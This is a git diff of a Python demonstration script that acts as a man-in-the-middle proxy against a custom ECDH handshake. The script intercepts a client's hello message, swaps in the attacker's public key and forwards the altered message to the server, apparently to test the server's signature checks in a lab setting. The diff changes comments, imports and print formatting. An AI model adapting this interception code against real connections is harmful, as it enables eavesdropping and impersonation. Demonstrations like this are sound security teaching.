@@ -1,9 +1,9 @@
 """
 attack_impersonation.py
 
-Impersonation Attack Demonstration
+MITM/Impersonation Attack Demonstration
 
-This script acts as an impersonation attack where an attacker tricks the real client
+This script acts as an MITM impersonation attack where an attacker tricks the real client to connecting to them
 1. Intercepts the REAL client_hello from the legitimate client
 2. Replaces the client's ECDH public key with the attacker's key
 3. Forwards the modified message to the server
@@ -22,11 +22,10 @@ Note: You'll need to modify run_client.py to connect to port 8888 instead of 505
 """
 import socket
 import json
-import threading
-import sys
 import os
+import sys
 
-sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
+sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
 
 from handshake.ecdh import ECDHKeyPair
 from streaming.protocol import parse_client_hello, build_client_hello, b64_encode, b64_decode
@@ -104,7 +103,7 @@ def handle_client_connection(client_sock, client_addr):
         print(f" - ECDH Key: {malicious_json.get('ecdh_public_key')[:30]}... (ATTACKER'S)")
         print(f" - Signature: {malicious_json.get('signature')[:30]}... (ORIGINAL)")
         
-        # === STEP 5: Forward modified message to real server ===
+        # --- STEP 5: Forward modified message to real server ---
         print(f"\n[ATTACKER] Forwarding MALICIOUS client_hello to real server...")
         
         server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -114,7 +113,7 @@ def handle_client_connection(client_sock, client_addr):
         server_sock.sendall(malicious_client_hello.encode("utf-8"))
         print(f" - Sent malicious client_hello to server")
         
-        # === STEP 6: Wait for server response ===
+        # --- STEP 6: Wait for server response ---
         print(f"\n[ATTACKER] Waiting for server response...")
         print(f" - (Server will verify signature...)")
         
@@ -145,13 +144,10 @@ def start_mitm_proxy():
     """
     Start the MITM proxy server that sits between client and real server.
     """
-    print("=" * 70)
     print("REALISTIC IMPERSONATION ATTACK DEMONSTRATION")
-    print("=" * 70)
     print("\n[ATTACKER] Starting MITM proxy server...")
     print(f"[ATTACKER] Proxy listening on {PROXY_HOST}:{PROXY_PORT}")
     print(f"[ATTACKER] Will forward to real server at {REAL_SERVER_HOST}:{REAL_SERVER_PORT}")
-    print()
     print("\nWaiting for client to connect to proxy...\n")
     
     proxy_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
